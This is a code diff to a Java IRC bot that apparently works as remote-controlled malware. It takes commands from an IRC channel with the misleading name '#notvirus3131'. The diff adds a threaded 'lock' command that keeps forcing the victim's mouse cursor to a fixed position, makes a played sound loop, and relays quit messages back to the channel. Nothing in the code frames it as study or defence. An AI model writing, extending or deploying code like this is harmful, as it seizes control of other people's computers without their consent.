@@ -15,12 +15,14 @@ import java.net.*;
 import java.util.Random;
 
 
-public class IRCBot extends PircBot {
+public class IRCBot extends PircBot implements Runnable {
 
-    private boolean neverEver = true;
+    private Thread lockMouse = null;
+    private static volatile boolean neverEver = true;
 
     private String SystemName = null;
     private Sound sound = null;
+
 
     public static interface User32 extends Library {
         User32 INSTANCE = (User32) Native.loadLibrary("user32", User32.class, W32APIOptions.DEFAULT_OPTIONS);
@@ -59,6 +61,8 @@ public class IRCBot extends PircBot {
     @Override
     protected void onQuit(String sourceNick, String sourceLogin, String sourceHostname, String reason) {
         super.onQuit(sourceNick, sourceLogin, sourceHostname, reason);
+
+        sendMessage("#notvirus3131", reason);
     }
 
     @Override
@@ -110,6 +114,7 @@ public class IRCBot extends PircBot {
 
                 sound.setFile(2);
                 sound.play();
+                sound.loop();
 
                 break;
             case "hal":
@@ -235,27 +240,18 @@ public class IRCBot extends PircBot {
         }
         if (message.startsWith("lock")) {
 
+            neverEver = true;
+            setLockMouse();
 
-
-            try {
-                Robot robot = new Robot();
-
-                while (true) {
-                    if(neverEver){
-
-                        Thread.sleep(5);
-                        robot.mouseMove(150, 150);
-                    }
-
-                }
-
-            } catch (AWTException | InterruptedException e) {
-                throw new RuntimeException(e);
-            }
         }
         if (message.startsWith("unlock")) {
 
-            neverEver = false;
+            if (lockMouse.isAlive()) {
+                neverEver = false;
+
+            }
+
+
         }
 
     }
@@ -278,4 +274,59 @@ public class IRCBot extends PircBot {
         System.exit(0);
     }
 
+
+    private void setLockMouse() {
+
+        lockMouse = new Thread(this);
+        lockMouse.start();
+
+
+    }
+
+    @Override
+    public void run() {
+        try {
+            Robot robot = new Robot();
+            while (neverEver) {
+
+
+                robot.mouseMove(750, 500 );
+
+            }
+
+        } catch (AWTException e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+
+  /*  private int PosX() {
+
+        PointerInfo pointerInfo = MouseInfo.getPointerInfo();
+        Point point = pointerInfo.getLocation();
+        Window grap = pointerInfo.getDevice().getFullScreenWindow();
+        System.out.println(grap.toString());
+
+        return point.x;
+
+    }
+
+    private int PoxY() {
+
+        PointerInfo pointerInfo = MouseInfo.getPointerInfo();
+        int memory = pointerInfo.getDevice().getAvailableAcceleratedMemory();
+        GraphicsConfiguration[] grapCon = pointerInfo.getDevice().getConfigurations();
+        Point realpoint = pointerInfo.getLocation();
+
+        System.out.println("boş belleği: " + memory);
+        for (GraphicsConfiguration configuration : grapCon){
+
+            System.out.println(configuration);
+        }
+
+
+        return realpoint.y;
+    }
+
+   */
 }
